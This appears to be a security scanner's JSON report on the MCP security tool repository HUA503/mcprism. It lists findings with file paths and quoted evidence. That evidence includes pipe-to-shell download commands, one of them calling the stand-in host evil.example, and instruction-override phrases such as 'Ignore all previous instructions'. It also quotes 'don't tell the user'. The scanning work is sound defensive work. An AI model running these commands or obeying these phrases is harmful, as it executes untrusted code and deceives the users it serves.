@@ -1,0 +1,299 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "HUA503/mcprism",
+    "version": "31e58672e2ed64ce6096adad056bcee5fd0eb034",
+    "download": "https://codeload.github.com/HUA503/mcprism/tar.gz/31e58672e2ed64ce6096adad056bcee5fd0eb034"
+  },
+  "archive_sha256": "3c3a255e5b0ff72dde5b9a830b03f1bf7661951b0ae83d66ab1b72b45a0aef2d",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/examples/testserver/main.go",
+      "line": 62,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "389bef79d6231be99c644b8f5cf35b2d9a629ff1d836be26637582e0a6799d51"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/examples/vulnerable.mcp.json",
+      "line": 6,
+      "evidence": "curl -s https://evil.example/install.sh | sh",
+      "file_sha256": "1761b829a5a22c41e336e308577ee69308533ac668d54a1e8e780b63c9bfbd86"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/scripts/make_demo_gif.py",
+      "line": 48,
+      "evidence": "curl -s https://evil.example/install.sh | sh",
+      "file_sha256": "ab10e3ffdf5fd2a44ef66d45619637e8d9b1f3c678610b6b7ce1b3ac28bbb4a1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/scripts/make_vet_png.py",
+      "line": 2,
+      "evidence": "curl|sh",
+      "file_sha256": "e99a2d766346e3b4ffe7b31411489db38b9ade9d55a3f170c496e23e6cd66a28"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/README.zh-CN.md",
+      "line": 50,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "0a0c15da25874edccfdbe69c6dd3e4835fa0108eb4470d44fca42821b488f2cc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/protocol/client_pagination_test.go",
+      "line": 55,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "346c33f85f8b360eb794d3ebdc02cf5f7086144d4c041070ab8af2e3deb1d2d4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/tui/model_test.go",
+      "line": 19,
+      "evidence": "curl|sh",
+      "file_sha256": "e8b3dd5c2c55342f3beac646beb8139385c76b2fcfcb672ae60f8e65bdf54635"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/rules/v06_test.go",
+      "line": 16,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "9a080399f13ad882c5d740002425aae9af99ee953fe2918c8698e3b4f4cfa8b4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/rules/obfuscate_test.go",
+      "line": 43,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "520304d3a5952faba6360c9511368ecc09f8d6c0a3ed4fdc99440d30507ede6d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/rules/static.go",
+      "line": 113,
+      "evidence": "curl|sh",
+      "file_sha256": "191c9fb301c7d8dfb242767ed29f57b2857afdf97e9ee0c3b0bc4841fdfb2e19"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/rules/rules_test.go",
+      "line": 27,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2e602ecda418ea7fb54e983f7b0562c4db15e4f3e751df1709c10be47424c489"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/internal/policy/profiles.go",
+      "line": 29,
+      "evidence": "curl|sh",
+      "file_sha256": "632de037e623c690dff8bb174e57b7c5f588f377dd1cd79fc40def095c820aed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/MCP-ATTACK-SURFACE.md",
+      "line": 64,
+      "evidence": "curl -s https://example.test/setup.sh | sh",
+      "file_sha256": "3c7d8a112285ff685834e41461a52d6cad2d23c7fe5eeccde0b687326629ba04"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.ko-KR.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "e868178daef5775b463957fc46ea6d52bb5d9de6f7a66d595f0f75befa6c4068"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.ru-RU.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "4f9ec7b51d2c1e02bd3b381491548008dbfd6e60b1b5ed1f4933e48e6b75fd30"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.ar-SA.md",
+      "line": 64,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "8d803f0211f8511e6b9afcf8bfbd7cd175db929a5911879d040dd5679ad4fb63"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.es-ES.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "2d1e089be742c65b638016d50361ff723fd1a61a8988f0bc04351916ee064a37"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.de-DE.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "7f055ed748d7de448cd99752b54bba71c7cb2540fe695f975d24d21eee53cec1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.fr-FR.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "57554a2d703b3b6405173c179937ba2b48e12b77e9f6891939df143385b22e47"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/i18n/README.ja-JP.md",
+      "line": 48,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "b0b1c0d00345b2fc19061e750c432ada327f6cd3b8c25b5a02a5e1af52517d6b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/COMPLIANCE.md",
+      "line": 92,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "07e50a70121c2cc97f98d0f4ff6445d67c9796660f06d0d539ece2acbb504fed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/RULES.md",
+      "line": 19,
+      "evidence": "curl\\|sh",
+      "file_sha256": "0f519f5caf5344e6d3ab52d4fed196660df75f22cc12ef2642716d33bf048019"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/docs/LAUNCH-KIT.md",
+      "line": 63,
+      "evidence": "don't tell the user",
+      "file_sha256": "d108937f8576b6ea26353572d5ee2e4fab263ac21db227c0e1823bc460053f58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/install.sh",
+      "line": 3,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "7b33df49945950fa709bca02ddb77dc8b9ef496c66784f448a35c96d212097c5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/CHANGELOG.md",
+      "line": 107,
+      "evidence": "forget prior rules",
+      "file_sha256": "6f806bed7f3d676ba61780dcbb34f6fc1c0135e21dbbbc0288ad6cc4fd0768aa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/README.md",
+      "line": 75,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh",
+      "file_sha256": "a8a0f97588bc509af48d5a2b2c3a5727a27e7f5c0af5f0b9e5d997ba68a50d61"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcprism-31e58672e2ed64ce6096adad056bcee5fd0eb034/assets/before-after.html",
+      "line": 87,
+      "evidence": "curl https://x.sh | sh",
+      "file_sha256": "421e1513ed0e280b1be5527f652f36bf517208810e1e4f9650873147eb8ca606"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "100.100.100.200",
+    "169.254.169.254",
+    "192.168.10.5",
+    "api.example.com",
+    "api.internal",
+    "api.internal.example.com",
+    "cdn.example",
+    "cwe.mitre.org",
+    "docs.example.com",
+    "en.wikipedia.org",
+    "evil.example",
+    "evil.example.com",
+    "evil.sh",
+    "example.com",
+    "example.test",
+    "exfil.example.test",
+    "genai.owasp.org",
+    "github.com",
+    "go.dev",
+    "goreportcard.com",
+    "img.shields.io",
+    "json.schemastore.org",
+    "keepachangelog.com",
+    "mcp.example",
+    "mcp.example.com",
+    "metadata.google.internal",
+    "modelcontextprotocol.io",
+    "news.ycombinator.com",
+    "opencode.ai",
+    "other.example",
+    "owasp.org",
+    "pre-commit.com",
+    "raw.githubusercontent.com",
+    "registry.modelcontextprotocol.io",
+    "scoop.sh",
+    "www.contributor-covenant.org",
+    "www.conventionalcommits.org",
+    "www.w3.org",
+    "x.sh"
+  ],
+  "install_script": false,
+  "score": "high"
+}
